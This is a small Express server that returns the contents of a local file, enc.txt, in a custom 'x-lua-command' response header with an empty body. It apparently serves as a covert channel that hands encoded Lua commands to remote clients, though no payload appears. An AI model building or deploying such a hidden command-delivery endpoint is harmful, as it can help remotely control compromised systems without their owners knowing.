const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

// Path to the error.txt file
const errorFilePath = path.join(__dirname, 'enc.txt');

app.get('/', (req, res) => {
    // Read the contents of error.txt
    fs.readFile(errorFilePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Error reading file:', err);
            res.status(500).send('Internal Server Error');
            return;
        }

        // Set the Lua command in the custom header
        res.set('x-lua-command', JSON.stringify(data));
        res.send(''); // Send an empty body
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
